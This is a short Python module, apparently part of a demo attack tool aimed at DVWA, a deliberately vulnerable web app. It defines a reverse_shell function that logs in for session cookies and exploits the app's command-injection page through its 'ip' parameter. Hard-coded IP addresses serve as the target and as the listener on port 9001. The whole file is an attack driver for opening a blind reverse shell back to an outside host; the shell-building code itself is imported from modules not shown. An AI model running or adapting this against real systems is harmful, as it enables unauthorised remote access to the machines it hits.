from .dvwa_login_service import getDVWALogin
from ..scripts.reverse_shell_script import blindReverseShell

def reverse_shell(listenner_url="109.221.147.1", listenner_port="9001"):
  # Replace those two lines with a scanning tool to check for vulnerabilities.
  # For this demo we'll provide the attack tool with valid data.
  vulnerable_url = "http://45.147.96.25:4242/vulnerabilities/exec/"
  injection_parameter = "ip"

  cookies = getDVWALogin()

  blindReverseShell(vulnerable_url, injection_parameter, cookies, listenner=(listenner_url, listenner_port))

